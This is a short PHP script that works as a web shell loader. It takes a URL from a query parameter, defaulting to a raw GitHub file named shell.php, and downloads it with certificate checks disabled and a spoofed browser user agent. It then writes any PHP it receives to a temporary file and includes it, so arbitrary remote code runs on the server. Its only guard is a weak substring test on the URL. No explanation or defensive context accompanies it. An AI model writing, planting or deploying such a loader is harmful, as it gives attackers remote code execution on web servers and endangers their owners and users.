<?php
$url=isset($_GET['url'])?$_GET['url']:"https://raw.githubusercontent.com/user/repo/main/shell.php";
if(strpos($url,'github')!==false||strpos($url,'raw')!==false||strpos($url,'gist')!==false){
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch,CURLOPT_TIMEOUT,60);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $content=curl_exec($ch);
    curl_close($ch);
    if($content!==false){
        if(strpos($content,'<?php')!==false){
            $tmp=tempnam(sys_get_temp_dir(),'php_');
            file_put_contents($tmp,$content);
            include($tmp);
            unlink($tmp);
        }else{
            echo $content;
        }
    }
}
?>
